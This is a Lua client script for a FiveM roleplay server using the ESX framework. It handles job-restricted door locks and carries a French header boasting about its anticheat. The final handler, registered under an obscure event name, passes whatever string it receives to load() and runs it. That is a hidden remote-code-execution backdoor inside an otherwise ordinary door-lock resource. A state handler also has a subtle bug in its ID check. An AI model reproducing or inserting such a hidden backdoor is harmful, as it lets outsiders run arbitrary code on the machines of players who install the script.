-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local PlayerData = {}

local displayText = _U('unlocked')

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end

	while ESX.GetPlayerData().job == nil do
		Citizen.Wait(10)
	end

	while ESX.GetPlayerData().job2 == nil do
		Citizen.Wait(10)
	end

	PlayerData = ESX.GetPlayerData()

	ESX.TriggerServerCallback('::{korioz#0110}::lockedDoors:getDoorInfo', function(doorInfo, doorCount)
		for localID = 1, doorCount do
			if doorInfo[localID] ~= nil then
				Config.DoorList[doorInfo[localID].doorID].locked = doorInfo[localID].state
			end
		end
	end)
end)

RegisterNetEvent('::{korioz#0110}::esx:setJob')
AddEventHandler('::{korioz#0110}::esx:setJob', function(job)
	PlayerData.job = job
end)

RegisterNetEvent('::{korioz#0110}::esx:setJob2')
AddEventHandler('::{korioz#0110}::esx:setJob2', function(job2)
	PlayerData.job2 = job2
end)

Citizen.CreateThread(function()
	PinInteriorInMemory(GetInteriorAtCoords(440.84, -983.14, 30.69))

	while true do
		Citizen.Wait(0)
		local plyCoords = GetEntityCoords(PlayerPedId(), false)

		for i = 1, #Config.DoorList do
			local theDoor = Config.DoorList[i]

			if GetDistanceBetweenCoords(plyCoords, theDoor.objCoords, true) < theDoor.distance then
				if PlayerData.job ~= nil or PlayerData.job2 ~= nil then
					if theDoor.locked then
						displayText = _U('locked')
					else
						displayText = _U('unlocked')
					end

					if (PlayerData.job.name == theDoor.job) or (PlayerData.job2.name == theDoor.job) then
						ESX.Game.Utils.DrawText3D(theDoor.textCoords, _U('press_button') .. displayText, theDoor.size)
					else
						ESX.Game.Utils.DrawText3D(theDoor.textCoords, displayText, theDoor.size)
					end

					if IsControlJustReleased(0, 38) then
						if (PlayerData.job.name == theDoor.job) or (PlayerData.job2.name == theDoor.job) then
							theDoor.locked = not theDoor.locked
							_TriggerServerEvent('::{korioz#0110}::lockedDoors:updateState', i, theDoor.locked, theDoor.job)
						else
							ESX.ShowAdvancedNotification('CaliforniaRP', '~y~Clefs', "Vous n'avez pas les clés de cette porte.", 'CHAR_CALIFORNIA', 7)
						end
					end
				end

				FreezeEntityPosition(GetClosestObjectOfType(theDoor.objCoords, 1.0, theDoor.objName, false, false, false), theDoor.locked)
			end
		end
	end
end)

RegisterNetEvent('::{korioz#0110}::lockedDoors:setState')
AddEventHandler('::{korioz#0110}::lockedDoors:setState', function(doorID, state)
	if type(Config.DoorList[id]) ~= nil then
		Config.DoorList[doorID].locked = state
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)